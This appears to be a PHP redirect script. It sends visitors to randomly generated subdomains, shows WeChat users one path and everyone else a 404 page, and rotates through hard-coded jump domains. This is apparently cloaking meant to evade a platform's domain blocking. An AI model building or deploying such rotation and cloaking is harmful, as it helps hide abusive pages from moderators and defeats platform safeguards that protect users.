<?php

header('Content-Type:text/html;charset=utf-8');
date_default_timezone_set('PRC');
set_time_limit(30);
include('include.php');

//error_reporting(0);
$short_prefix =str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '/' . strtolower(get_rand_str(1,6));
$tmpurl = "http://".strtolower(get_rand_str(3,3)).'.'.$index_domain.'/'.$short_prefix;
header('location:' . $tmpurl);
exit;

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

if(strpos($user_agent,'micromessenger') === false)
{
	include('404.php');
}



$http_host = $_SERVER['HTTP_HOST'];

$jump_1 = array('');

$jump_2 = array(
	'0' => array('1.bhno1.com'),
);

foreach($jump_1 as $key => $value)
{
	if(strpos($http_host,$value) !== false)
	{
		$domain = $jump_2[$key][rand(0,count($jump_2[$key]) - 1)];
		$url = 'http://' . get_rand_str(2,6) . '.' . $domain . '/';
		header('location:' . $url);
	}
}

$flag = true;
for($i = 0; $i < count($jump_2); $i ++)
{
	foreach($jump_2[$i] as $key => $value)
	{
		if(strpos($http_host,$value) !== false)
		{
			$flag = false;
			//$k = $i;
			$k = rand(0,count($final) - 1);
			$domain = $final[$k][rand(0,count($final[$k]) - 1)];
			$url = 'http://' . get_rand_str(2,6) . '.' . $domain . '/' . str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '.php?' . get_rand_str(1,6) . '=' . rand(1,9) . (time() * 3);
			header('location:' . $url);
		}
	}
}

if($flag)
{
	$k = rand(0,count($final) - 1);
	$domain = $final[$k][rand(0,count($final[$k]) - 1)];
	$url = 'http://' . get_rand_str(2,6) . '.' . $domain . '/' . str_pad(mt_rand(1,pow(10,5) - 1),5,'0',STR_PAD_LEFT) . '.php?' . get_rand_str(1,6) . '=' . rand(1,9) . (time() * 3);
	//header('location:' . $url);
	include('404.php');
}
	
?>
